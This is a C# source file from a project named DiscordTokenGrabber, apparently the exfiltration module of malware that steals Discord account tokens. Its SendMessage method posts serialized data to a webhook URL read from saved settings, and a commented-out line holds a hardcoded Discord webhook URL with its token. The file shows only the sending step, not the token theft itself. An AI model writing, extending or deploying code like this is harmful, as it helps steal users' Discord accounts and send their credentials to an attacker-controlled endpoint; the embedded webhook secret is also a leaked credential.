using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace DiscordTokenGrabber
{
    internal class DiscordWebhook
    {
        //static string WEBHOOK_URL = "https://discord.com/api/webhooks/1200407227803119649/l-t_ucK3abZTw1uA5RD0gYnf1HPbMjnX0-40wy2fL97a3BhzN-nKrp9nVVeqcNqKA7yj";
        public static void SendMessage(DiscordMessageStructure _info)
        {
            string _webHook = GetWebHook();
            HttpClient _client = new HttpClient();
            _client.BaseAddress = new Uri(_webHook);
            _client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            HttpRequestMessage _req = new HttpRequestMessage(HttpMethod.Post, _webHook);
            _req.Content = new StringContent(JsonConvert.SerializeObject(_info), Encoding.UTF8, "application/json");
            _client.SendAsync(_req).Wait();
        }


        private static string GetWebHook()
        {
            SaveItem _save = new SaveItem();
            return _save.GetWebHook();

        }
    }
}
